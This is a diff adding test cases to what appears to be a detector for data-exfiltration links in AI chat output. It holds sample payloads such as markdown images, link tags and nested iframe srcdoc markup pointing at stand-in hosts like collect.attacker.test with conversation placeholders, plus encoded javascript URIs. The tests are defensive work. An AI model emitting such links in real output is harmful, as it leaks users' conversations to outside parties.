@@ -263,6 +263,15 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<form action='https://api.test/users/{id}'></form>", []),
         ("<div data='https://a.test/{x}.png' title='x'>", []),
         ("<span href='javascript:alert(1)'>text</span>", []),
+        ("<link rel='canonical' href='https://a.test/{c}'>", []),
+        ("<link rel='Stylesheet alternate' href='https://collector.test/{c}.css'>", ["exfiltration_query"]),
+        ("<link rel='preload' as='style' imagesrcset='https://collector.test/{c}.png'>", []),
+        ("<blockquote cite='https://a.test/?q={c}'>x</blockquote>", []),
+        ("<iframe srcdoc='' src='https://collector.test/{c}'></iframe>", []),
+        (
+            "<iframe srcdoc='&lt;img src=https://collector.test/{c}.png&gt;' src='https://a.test/'></iframe>",
+            ["exfiltration_query"],
+        ),
         ("<div src='https://collector.test/{c}.png'></div>", []),
         ("<input type='text' src='https://collector.test/{c}.png'>", []),
         ("<input type='image' src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
@@ -299,6 +308,11 @@ def test_exfiltration_link_classes(text: str, expected: list[str]) -> None:
         ("\ud800 [q](https://a.test/?q={d})", ["exfiltration_query"]),
         ("<a href='da&#9;ta:text/html,hello'>open</a>", ["data_uri"]),
         ("Metadata: see [docs](https://docs.example.com)", []),
+        (
+            "<iframe srcdoc='&lt;img src=&quot;https://collector.test/?d=&amp;#123;c&amp;#125;&quot;&gt;'>",
+            ["exfiltration_query"],
+        ),
+        ("<iframe srcdoc='&lt;a href=&quot;jav&amp;#97;script:x&quot;&gt;'>", ["script_uri"]),
         ("![x](https://collector.test/p.png?u=$ID)", ["exfiltration_query"]),
         ("<img src='\\\\collector.test\\{conversation}.png'>", ["exfiltration_query"]),
     ],
@@ -576,4 +590,11 @@ def test_nested_srcdoc_is_followed_at_every_depth_that_fits() -> None:
     assert depth >= 4
     started = time.perf_counter()
     assert exfiltration_link_classes(nest(image, depth)) == ["exfiltration_query"]
+    assert time.perf_counter() - started < 5
+
+
+def test_repeated_escaping_in_oversized_text_is_decoded_in_bounded_time() -> None:
+    text = "&" + "amp;" * (MAX_LINK_MARKDOWN_BYTES // 2) + "#123;c} <a href='https://a.test/'>"
+    started = time.perf_counter()
+    exfiltration_link_classes(text)
     assert time.perf_counter() - started < 5
